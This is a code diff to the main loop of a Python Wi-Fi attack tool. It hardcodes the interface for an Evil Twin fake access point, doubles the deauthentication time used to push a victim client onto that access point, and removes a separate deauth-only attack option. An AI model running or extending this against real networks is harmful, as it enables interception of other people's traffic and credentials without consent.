@@ -84,13 +84,13 @@ def main():
                                     
                                     # Start Evil Twin (creates fake AP first)
                                     if captive.quick_start(
-                                        iface,
+                                        "wlan0",
                                         target_bssid,
                                         info['SSID'],
                                         info['Channel'] or 6
                                     ):
                                         # Now deauth the client to force reconnection
-                                        duration = 30
+                                        duration = 60
                                         print(f"\n[*] Deauthing client {client_mac} for {duration} seconds...")
                                         print("[*] Client should reconnect to our fake AP")
                                         
@@ -111,20 +111,6 @@ def main():
                                         captive.stop_evil_twin()
                                     else:
                                         print("[ERROR] Failed to setup Evil Twin")
-                                
-                                elif attack_choice == 'd':
-                                    # Regular deauth attack
-                                    duration = input("Enter attack duration in seconds (default 30): ").strip()
-                                    duration = int(duration) if duration.isdigit() else 30
-                                    
-                                    print("\nStarting deauth attack...")
-                                    dauth.start_attack(client_mac, target_bssid, iface, duration)
-                                    
-                                    # Wait for attack to complete
-                                    while dauth.is_attack_running():
-                                        time.sleep(0.5)
-                                    
-                                    print("\nAttack completed!")
                                 
                                 # After attack or if user chose 'n'
                                 if attack_choice != 'q':
